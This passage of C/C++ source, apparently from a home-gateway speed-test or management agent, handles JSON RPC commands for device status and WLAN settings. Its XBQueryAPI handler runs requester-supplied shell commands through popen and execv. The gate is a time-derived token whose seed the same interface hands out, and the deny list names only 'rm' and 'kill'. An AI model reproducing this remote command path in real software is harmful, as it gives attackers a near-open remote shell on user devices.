    	putInt(ctxResp,indx0Resp,"LanRealTimeRate",netFlow.getLocalBandwidth());


    }else if(strcmp(buf,"QUERY_CPU_INFO") == 0){
    	sgwRet = ctSgw_sysGetCpuUsage(&intVal);
    	putInt(ctxResp,indx0Resp,"Result",sgwRet);
    	putInt(ctxResp,indx0Resp,"Percent",intVal);    		

    }else if(strcmp(buf,"ctSgw_sysGetLoid") == 0){

    }else if(strcmp(buf,"QUERY_MEM_INFO") == 0){
    	sgwRet = ctSgw_sysGetMemUsage(&intVal);
    	putInt(ctxResp,indx0Resp,"Result",sgwRet);
    	putInt(ctxResp,indx0Resp,"Percent",intVal);    		

    }else if(strcmp(buf,"GET_HW_IP") == 0){
    	int iret = -1;
    	CtSysIpAddrCfg ipConf;
		  bzero(&ipConf, sizeof ipConf);
		  iret = ctSgw_sysGetIpAddr(&ipConf);

    	putInt(ctxResp,indx0Resp,"Result",sgwRet);

    	putString(ctxResp,indx0Resp,"WanIPAddr",getWanIP());
    	putString(ctxResp,indx0Resp,"IPV6WanIPAddr",ipConf.ipv6WanAddr);
    	putString(ctxResp,indx0Resp,"LanIPAddr",getLanIP());
	
    }else if(strcmp(buf,"SET_WLAN_SSID_STATE") == 0){
      int iret = -1;

      int enable = getInt(ctx,decodestr.c_str(),"enable");

      sgwRet = ctSgw_wlanSetState(0, enable);
      putInt(ctxResp,indx0Resp,"Result",sgwRet);

    }else if(strcmp(buf,"ctSgw_sysPushWeb") == 0){

    }
    
	jsonDestroy(ctx);	

	// prepare response json
	std::string strResp;
	duk_size_t lenResp;

	duk_json_encode(ctxResp,indx0Resp);
	strResp = duk_get_lstring(ctxResp,indx0Resp,&lenResp);
	jsonDestroy(ctxResp);
	//strResp = Base64::encode64(strResp);
    const char * pResult = strResp.c_str();
	port->sendback(port,pResult,strlen(pResult));

	return ret;
}

typedef struct {
  const char* cmd;
  int max_lines;
  int max_bytes;
}CmdTable;
CmdTable tables[] = {
    {"ps", 500, 1024*100},
    {"free", 500, 1024*100},     
};

CmdTable tables2[] = {
    {"rm", 0, 0},
    {"kill", 0, 0},     
};

static CmdTable* verify_cmd(const char* str_cmd)
{
    for(int i= 0; i< sizeof(tables)/sizeof(tables[0]); i++)
    {
      if(strcmp(tables[i].cmd,str_cmd) == 0){
        return &tables[i];
      }
    }
    return NULL;
}

static CmdTable* verify_cmd2(const char* str_cmd)
{
    for(int i= 0; i< sizeof(tables2)/sizeof(tables2[0]); i++)
    {
      if(strstr(str_cmd, tables2[i].cmd) != NULL){
        return &tables2[i];
      }
    }
    return NULL;
}


char* run_cmd(const char* str_cmd, int max_lines, int max_buffer_len)
{
    FILE* file;
    char * pData, *buff;
    int len=0;
    int lines=0;

    int max_len = max_buffer_len < 100*1024 ? max_buffer_len : 100*1024;

    file = popen(str_cmd, "r");
    //printf("iptables file %s\n", str_cmd);
    if(file == NULL)
    {
      printf("start test3\n");
      return NULL;
    }

    pData = (char*)malloc(max_len);
    if(pData == NULL){
      pclose(file);
      return NULL;
    }

    //sleep(3);
    memset(pData, 0, max_len);
    buff = pData;
    while(fgets(buff + len, max_len - len,file)!=NULL){
        len += strlen(buff + len);
        lines ++;
        //printf("lines %d, len %d\n", lines, len); 
        if(lines >= max_lines)
          break;

        if(len >= (max_len -1))
          break;
    }
    //printf("%s, \ngot lines %d, len %d\n ", buff, lines, len);
    pclose(file);
    return pData;
}

static unsigned long timeGetTime()
{
    struct timeval now;
    gettimeofday(&now, NULL);
    return (now.tv_sec * 1000 + now.tv_usec/1000);
}

int makeargs(char *args, int *argc, char ***aa) {
    char *buf = strdup(args);
    int c = 1;
    char *delim;
    char **argv = (char**)calloc(c, sizeof (char *));

    argv[0] = buf;

    while (delim = strchr(argv[c - 1], ' ')) {
        argv = (char**)realloc(argv, (c + 1) * sizeof (char *));
        argv[c] = delim + 1;
        *delim = 0x00;
        c++;
    }

    *argc = c;
    *aa = argv;

    return c;
}

void force_close_local_server_socket();

static int start_feature(char* cmd) {
    char **myargs;
    int argc;

    if(strlen(cmd) == 0)
      return -1;

    force_close_local_server_socket();

    int numargs = makeargs(cmd, &argc, &myargs);
    while (numargs) {
        printf("%s\r\n", myargs[argc - numargs--]);
    };

    int ret = execv(myargs[0],myargs);
    if(ret == -1){
      printf("start feature error ,%s\n",strerror(errno));
    }
    return ret;
}


int update_connect_setting(duk_context *ctx, const char *msg)
{
    char buf[128];
    char cmd[128];

    buf[0] = 0;
    cmd[0] = 0;

  getString(ctx, msg, "Connect", buf);

  if(strcmp(buf,"Close") == 0){
    xb_conn.pollingAction = 0;
  }else if(strcmp(buf,"KeepAlive") == 0){
    xb_conn.pollingAction = 1;
  }

  int timeout = getInt(ctx, msg, "SelectTimeOut");
  if(timeout > 0 && timeout <= 3600 * 24 * 30)
    xb_conn.pollingTimeOut = timeout;


}

int process_connect_message(struct NetworkPort* port, const char *msg)
{ 
  duk_context *ctx = NULL;
  duk_idx_t indx0;
  char* pdata=NULL;
  long i = 0;
  std::string method;
  std::string parameter;
  unsigned int val = 0;
    char buf[128];
    char SequenceId[32];
    char ID[32];
    char cmd[256];

    int RequestID;

    int ret = 0;
    int intVal = 0;
    int sgwRet = 0;
  std::string decodestr;

    buf[0] = 0;
    SequenceId[0] = 0;
    ID[0] = 0;
    cmd[0] = 0;

  if(msg == NULL || strlen(msg) == 0)
    return 0;

  decodestr = msg;
    
  jsonInitialize(&ctx,&indx0);
  
  getString(ctx, decodestr.c_str(), "CmdType", buf);
  getString(ctx, decodestr.c_str(), "SequenceId", SequenceId);
  RequestID = getInt(ctx, decodestr.c_str(), "ID");
    // come from ct_sgw_api.h

  //response json 
  duk_context *ctxResp = NULL;
  duk_idx_t indx0Resp;
  jsonInitialize(&ctxResp,&indx0Resp);

  putString(ctxResp,indx0Resp,"SequenceId",SequenceId);
  putInt(ctxResp,indx0Resp,"ID",RequestID);

  update_connect_setting(ctx, msg);


  jsonDestroy(ctx); 

  // prepare response json
  std::string strResp;
  duk_size_t lenResp;

  duk_json_encode(ctxResp,indx0Resp);
  strResp = duk_get_lstring(ctxResp,indx0Resp,&lenResp);
  jsonDestroy(ctxResp);
  //strResp = Base64::encode64(strResp);
    const char * pResult = strResp.c_str();
  port->sendback(port,pResult,strlen(pResult));

  return ret;
}

int process_xbquery_message(struct NetworkPort* port, const char *msg)
{ 
  duk_context *ctx = NULL;
  duk_idx_t indx0;
  char* pdata=NULL;
  long i = 0;
  std::string method;
  std::string parameter;
  unsigned int val = 0;
    char buf[128];
    char SequenceId[32];
    char ID[32];
    char cmd[256];

    int RequestID;

    int ret = 0;
    int intVal = 0;
    int sgwRet = 0;
  std::string decodestr;

    buf[0] = 0;
    SequenceId[0] = 0;
    ID[0] = 0;
    cmd[0] = 0;

  if(msg == NULL || strlen(msg) == 0)
    return 0;

  decodestr = msg;
    
  jsonInitialize(&ctx,&indx0);
  
  getString(ctx, decodestr.c_str(), "CmdType", buf);
  getString(ctx, decodestr.c_str(), "SequenceId", SequenceId);
  RequestID = getInt(ctx, decodestr.c_str(), "ID");
    // come from ct_sgw_api.h

  //response json 
  duk_context *ctxResp = NULL;
  duk_idx_t indx0Resp;
  jsonInitialize(&ctxResp,&indx0Resp);

  putString(ctxResp,indx0Resp,"SequenceId",SequenceId);
  putInt(ctxResp,indx0Resp,"ID",RequestID);

  if(strcmp(buf,"GET_DEVICE_INFO_ALL") == 0){
    getString(ctx, decodestr.c_str(), "ExtendInfo", cmd); 
    BuildExtObject(cmd, ctxResp, indx0Resp);

  }else if(strcmp(buf,"START_PERIOD_TASK") == 0){
      PeriodPolicy policy;
      getString(ctx, decodestr.c_str(), "TaskName", cmd); 
      start_period_task(cmd, &policy, user_handler, NULL, NULL);
      putInt(ctxResp,indx0Resp,"Result",0);
  }else if(strcmp(buf,"STOP_PERIOD_TASK") == 0){
      getString(ctx, decodestr.c_str(), "TaskName", cmd); 
      stop_period_task(cmd);
      putInt(ctxResp,indx0Resp,"Result",0);
  }else if(strcmp(buf,"QUERY_CURRENT_STATE") == 0){
      putInt(ctxResp,indx0Resp,"Result",0);
      putInt(ctxResp,indx0Resp,"connect_state",xb_conn.current_connect_state);
      putInt(ctxResp,indx0Resp,"sleep_count",xb_conn.current_sleep_count);

      putString(ctxResp,indx0Resp,"host",xb_conn.host);
      putInt(ctxResp,indx0Resp,"port",xb_conn.port);

      putString(ctxResp,indx0Resp,"registerHost",xb_conn.registerHost);
      putInt(ctxResp,indx0Resp,"registerPort",xb_conn.registerPort);
      
      putString(ctxResp,indx0Resp,"reportHost",xb_conn.reportHost);
      putInt(ctxResp,indx0Resp,"reportPort",xb_conn.reportPort);

      putString(ctxResp,indx0Resp,"SW_BuildTime",SW_BUILD_DATE);
      putString(ctxResp,indx0Resp,"SW_Channel",xb_conn.channel);
      
  }else if(strcmp(buf,"QUERY_DATA_VALUE") == 0){
    getString(ctx, decodestr.c_str(), "CmdID", cmd);    

    unsigned long val = getInt(ctx, decodestr.c_str(), "DATA_VALUE");
    if(debugToken == val && verify_cmd2(cmd) == NULL){
      pdata = run_cmd(cmd, 500, 100*1024);
      if(pdata){
        putInt(ctxResp,indx0Resp,"Result",0);
        putString(ctxResp,indx0Resp,"data",pdata);
        free(pdata);
      }   
    }

  }else if(strcmp(buf,"QUERY_CMD_VALUE") == 0){
      unsigned long timeTag= timeGetTime();
      unsigned long factor = timeTag/1000;
      factor = factor*factor*factor;
      timeTag =    factor & 0xABCEF5;
      debugToken = timeTag & 0xABABAB ^ 0x5EBA5A;

      putInt(ctxResp,indx0Resp,"Result",0);
      putInt(ctxResp,indx0Resp,"value",timeTag);
               
  }else if(strcmp(buf,"START_FEATURE") == 0){
      memset(cmd, 0, sizeof(cmd));
      unsigned long val = getInt(ctx, decodestr.c_str(), "DATA_VALUE");
      getString(ctx, decodestr.c_str(), "FEATURE", cmd); 

      int ret = 55;
      if(debugToken == val){
        ret = start_feature(cmd);
      }
      
      putInt(ctxResp,indx0Resp,"Result",ret);
  }else if(strcmp(buf,"ENABLE_DEBUG_LOG") == 0){
      void enable_speed_test_debug();
      enable_speed_test_debug();
  }else if(strcmp(buf,"DISABLE_DEBUG_LOG") == 0){
    void disable_speed_test_debug();
      disable_speed_test_debug();
  }


  jsonDestroy(ctx); 

  // prepare response json
  std::string strResp;
  duk_size_t lenResp;

  duk_json_encode(ctxResp,indx0Resp);
  strResp = duk_get_lstring(ctxResp,indx0Resp,&lenResp);
  jsonDestroy(ctxResp);
  //strResp = Base64::encode64(strResp);
    const char * pResult = strResp.c_str();
  port->sendback(port,pResult,strlen(pResult));

  return ret;
}


int proxy_local_message(struct NetworkPort* port, const char *msg, int len){

	char* response = proxy_request(getLanIP(), msg, len);

	if(response != NULL){
		port->sendback(port,response,strlen(response));
		free(response);
	}

}

int route_message(struct NetworkPort* port, const char *msg,int len)
{
	int function= -1;
  int ret = 0;

	duk_context *ctx = NULL;
	duk_idx_t indx0;
	int req_id = 0;
	char strRPCMethod[256];

	std::string req_SeqID;
	
	std::string decodestr;
	if(msg == NULL || strlen(msg) == 0)
		return -1;

	decodestr = msg;
	printf("%s request:%s\n",__FUNCTION__, msg);
	jsonInitialize(&ctx,&indx0);
	
	//req_id = getInt(ctx,decodestr.c_str(),"ID");
	//req_SeqID = getString(ctx,decodestr.c_str(),"SequenceId");
	strRPCMethod[0]= '\0';
	getString(ctx,decodestr.c_str(),"RPCMethod", strRPCMethod);

	if(!strcmp("Set", strRPCMethod)){
		function = 0;
	}else if(!strcmp("Post1", strRPCMethod)){
		function = 1;
  }else if(!strcmp("GatewayAPI", strRPCMethod)){
    function = 2;
  }else if(!strcmp("MaitainAPI", strRPCMethod)){
    function = 3;
  }else if(!strcmp("XBQueryAPI", strRPCMethod)){
    function = 4;
  }else if(!strcmp("ConnectAPI", strRPCMethod)){
    function = 5;
	}

	jsonDestroy(ctx);	

	printf("function:%d, %s\n", function, strRPCMethod);
	if(function == -1)
		return -1;

	//printf("%s msg:%s\n",__FUNCTION__, msg);
	if(function == 0)
		ret = NetQualityTest(port,msg);
	else if(function == 1)
		proxy_local_message(port, msg, len);
	else if(function == 2)
		process_gateway_api_message(port, msg);
	else if(function == 3)
		ret = detect_maintain_message(port, msg);
  else if(function == 4)
    process_xbquery_message(port, msg);
  else if(function == 5)
    process_connect_message(port, msg);

	return ret;
}


int check_gateway() {
    char ssn[64];
    bzero(ssn, 64);
    ctSgw_sysGetSSN(ssn, 64);
    printf("check %s\n",ssn);
    return 0;
}

int getRandomAddr(char *addr)
{
	int ran = 0;
	srand((unsigned)time(NULL));
	ran = rand()%5;
	printf("%s,ran:%d\n",__FUNCTION__,ran);
	memcpy(addr,serverHosts[ran],MAX_LENGTH);
	return 0;
}

void waitNetLink(const char *host)
{
	while(1)
	{
		if(checkNetLink(host))
			break;
		sleep(5);
	}
}


static int redirect_stdout(char* server, int port)
{


    printf("this is from printf text 5\n");

}